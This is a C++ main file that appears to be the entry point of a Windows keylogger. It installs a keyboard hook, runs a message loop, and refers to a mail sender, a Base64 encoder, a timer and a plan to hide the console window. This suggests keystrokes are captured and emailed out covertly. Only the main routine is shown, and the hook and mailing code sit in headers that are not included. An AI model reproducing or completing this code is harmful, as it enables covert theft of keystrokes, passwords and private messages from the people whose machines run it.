#include "windows.h"
#include <iostream>
#include "DLC.h"
#include "const_keys.h"
#include "Base64Encoder.h"
#include "IO.h"
#include "Timer.h"
#include "MailSender.h"
#include "Keybhook.h"
using namespace std;

int main ()
{
    MSG infmsg; //TODO inf message for hiding consolee
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
    while(GetMessage (&infmsg, NULL, 0, 0))
    {
        TranslateMessage(&infmsg);
        DispatchMessage(&infmsg);
    }
    MailTimer.Stop();

    return 0;
}

